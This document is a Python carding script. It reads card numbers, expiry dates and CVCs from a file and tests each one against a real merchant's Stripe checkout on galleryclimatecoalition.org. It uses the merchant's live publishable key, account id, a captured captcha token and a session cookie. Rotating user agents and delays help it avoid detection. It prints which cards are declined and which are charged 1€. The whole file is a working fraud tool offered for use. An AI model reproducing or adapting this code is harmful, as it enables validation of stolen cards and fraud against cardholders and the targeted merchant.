import requests,random,time,re
from user_agent import generate_user_agent
from colorama import Fore
blue=Fore.BLUE;green=Fore.GREEN;red=Fore.RED;white=Fore.WHITE;yellow=Fore.YELLOW;black=Fore.BLACK
file=open('cc.txt',"+r")
nm = 0
for P in file.readlines():
	nm += 1
	num = f"{nm:03}" 
	n = P.split('|')[0]
	mm = (P.split('|')[1])
	if "0" not in mm and int(mm) <=9:
		mm = f"0{mm}"
	yy = P.split('|')[2]
	if "20" in yy:
		yy = yy[2:]
	cvc = P.split('|')[3].replace('\n', '')
	P = P.replace('\n', '')
	user=generate_user_agent()
	time.sleep(7)
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,}

	data = f'type=card&billing_details[address][postal_code]=97232&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=3bd309e1-43c0-4190-9cd2-07fa077f1b1b9ccfe3&muid=8434f1d9-e441-4a0f-af2d-5a3cd64d140eb2e887&sid=396463d9-b232-417c-be06-3b3dd406eb0f32e792&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+split-card-element&referrer=https%3A%2F%2Fgalleryclimatecoalition.org&time_on_page=37574&key=pk_live_OC4ftTyuGNtAcLvMnh7Fz889&_stripe_account=acct_1HaHgQGvI1equNqy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZnfufykV9x6B9FLIDpIBupzET688WFC2BlZ9Fvydwgk0J6T-wM2wcX7QalmxJe1e4O2HFYaPXZKNixidN74Wr4Qy1POoUIGOv1yotDLYKoP6Uw89qjVwy75pGXVckKi8Fzh3oZ4ipVlcQaRNp-2g0AAe4cUAJ6TFsm020swcy28vzBHfdOD1pAhKnPRWMCwG9t5CeFSYdUcKY99bVvNCzdSGydy_qjlzUCdCCkF70ugUB-OuTQ2nAmMlZMSBxlPPU5YtLuhQQQhsL3IB4EPumqNsZH2bLWGJoLBpx2uVWwaFl7RtidXCMBVCNPuk_jyYy0-U9YRDPjkAnDMuYoWPwWFzl91A25-idYHSJ12s8Ofm4107rEJOny8KRbfVWPJEkLphPii-wsRl_gVPlz03pOYOe5UWw0PR6Q8GRRjka5nI73jo6JmeBJXK86LKnPLGSB3DFAAMrKyxbZHhCos5uFxqL9vp5GzNdSOKItMOxbAgTEyR6u7M8zqWLmOtSNfIlyvSB7IltHk28BcPd1X4bpHwzMIEu_5EQtCfEHHKMbyJJI79dYBiDhFKIlkETLqQStSYd_Z1AS5HTtxBEyNaJHdIir2_0TPhJXS_Fm7yV3Oi--NjdM5ePSxaeQUZFgjpu4J45bXPaKDoUF_nCR8_bo60ZQFqqNRA9laa6XzgL6ovL5Q5gCUPcXfjC7G3riOJdRAg0IWRglgiEjbYlg0ZB5-PtyODxMXUF_DCngNdIOty-EHBbWGk3jKtGkHIHeM43M9rYJ4krOdxGb9bwex80GHNfj12HBsiN3pnbt7TvMDtc54cRnHrz2iIZvE9Zbc87ILTXemSfEZvqbcPR8O7jT9xBXVLwfFvZqPv66p68UupQtU2XVq6qNTlnnyAnVQ64AVe4IEX2OB4AWCEF1MQ67egBjGlcBvBz8m2PRuVOYBeRf-2sKmW6NEs6Ht5IWz7oJ590c-USlRiCnGIaqWpELT-KGmtkhI1IX0o4u1RVH5EJFm9n1yF-lHbMj7C2Ma-WNVqsgoL9D49O136ZOUrnKLuE0coSHeQD424nqkIEzD3BXO-xEG71zauwNP4OjniCYZLmV6bVORifWAZT_wGhisje_G0BEHM7EnwO_5epC5CEqw9xo8-bL2JNDhBPGtiYzwuP41GE8vr1Tl6yssgNFfuYhEGSmprdwLFuHwd_XVxzJxs12JEzOpeXgKJIokjMi2a-OVI7h6zdJtRK3bXuaHoq7kLL3Rm_GwY8XD0-e_MVxrYIgVvUf6OG_etcOD9tyPIFgx9pIs_6pjJHLFdhLWWvBDkoCpEgtsPqn9syWedJg2V6unBgI3xyu63pgjdp16JZvBf1kLWPOQjQp8u34M3iDIrqpaGuJjXRGKLcPWFA5nAUqt0ZZlsGOtSIpYsqPTEddyJO143nXQHGTqRRIBNSQ4wh_8rE5yuJTNCUQTepFQiG-_bs3WoDhM2ueXZpv7oKLXDmCkc8i7EJK98laCnDpYhKmKg0CF5mDAg6DVVfxVCeifKI-OiipFJFxQssigslapxG4SXGOJVCyh-c75_I9sB3COtxvzhXSgL2LRKAsA1tpwnFVD8hfGYN_AtjD6Nt78S6gVrIwkzyY7CzTpnGNRwZfsi0QXmAgbTi_nAmCI12hpKQ6gx9oSBfn1LA8F1DUJATroLQlnVGtA056BXPsB_U5nFx0_4Zm_Qni-YSvh4rqG6udmrQmDvG3ccbYQIEhPazYBlCya3crsLWrBkt8SzJcMj-NxyYdOhBTgOcfftPr8xon-koohfEISuLQ9pijdMm8CR5Oe3dERzeT7-W49dVt11DrQAoVpgWXrUAk3LcGEO5b050b_YcQ8YZenTUs4XgA26O2Egd4BKl_HAEXNfRJR5qFhF8I4-E8kudgVh4l5Vzp3AMECPBEkVrcKtC5R2pR26D7LcA4fHPmyTrcYfgs2XHeol2W0aIYEiDIDcYU7xeXt1XEwZhIIPKKaPFLtNK7OCGZ9G4YfuKe3-ia828HPff0PEgYFgbNghNG-T6EsF5xq2UWvxUm9Poud1UV60LkeI7g822NiPctDxZpeo5xzHuk_pof2p9vnkFjwtrnD8naZd6eTxtwAlK5okURaRikQbY2bgUZdtb926Fn82pIOTdT97FgeQQ0If5-ua3N5gTbDuEjkC0mh-P4KfPbx_TeGaNleHDOZosgzahzaGFyZF9pZM4DMYNvomtyqDFhZmQxZTRjonBkAA.c787TIRh4w61mmL_b8mXstzFj8e8L2J5V1oz32Ztm7U'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		all_response = (response.text)
		pm = response.json()["id"]
	except:
		time.sleep(3)
		continue
	cookies = {
    'gcc': '86d4822d07b0334a4c067ad1c431a85c947b0c201b7751d66d9042f0beec68defda58bf8',}
	headers = {
    'authority': 'galleryclimatecoalition.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://galleryclimatecoalition.org',
    'referer': 'https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',}

	data = {
    'payment_method_id': pm,
    'payment': all_response,
    'proxy_dir': '',
    '_cmspreview': '',}

	response = requests.post(
    'https://galleryclimatecoalition.org/cart/stripe_create_confirm_payment_intent/',
    cookies=cookies,
    headers=headers,
    data=data,)
	try :
	   	respon = (response.json()["stripe_error"])
	   	error = (response.json()["error"])
	   	if "Your card was declined." in respon:
	   		respon = red+respon
	   	else :
	   		respon = green+respon
	   	if "payment_not_authorised" in error:
	   		error = red+error
	   	else:
	   		error = green+error
	   	print(white+f"[ {yellow}{num} {white}]",f"{n}|{mm}|{yy}|{cvc}",":",respon,f"{white}[ {error} {white}]")
	except:
		print(white+f"[ {yellow}{num} {white}]",f"{n}|{mm}|{yy}|{cvc}",green+"Charge 1€")